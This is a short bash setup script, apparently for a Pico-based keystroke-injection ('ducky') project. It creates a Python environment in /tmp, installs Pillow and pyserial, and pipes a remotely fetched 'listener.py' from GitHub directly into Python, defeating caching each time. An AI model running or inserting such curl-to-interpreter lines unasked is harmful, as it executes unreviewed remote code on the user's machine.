#!/bin/bash
set -euo pipefail

LISTENER_URL="https://raw.githubusercontent.com/JBlitzar/picoducky/refs/heads/main/cc-src/listener.py"

# Pick a Python
if command -v python3 &> /dev/null; then
    PYTHON=python3
elif command -v python &> /dev/null; then
    PYTHON=python
else
    echo "Python is required but not found" >&2
    exit 1
fi

cd /tmp
"$PYTHON" -m venv pd_env_de25bd4d7600c5a0388d5338886ecc0f
source pd_env_de25bd4d7600c5a0388d5338886ecc0f/bin/activate

pip install Pillow pyserial

# Run the listener; add cache-busting query so we always fetch the latest
CB="$(date +%s%N 2>/dev/null || date +%s)"
curl -sSL "${LISTENER_URL}?t=${CB}" | pd_env_de25bd4d7600c5a0388d5338886ecc0f/bin/python -

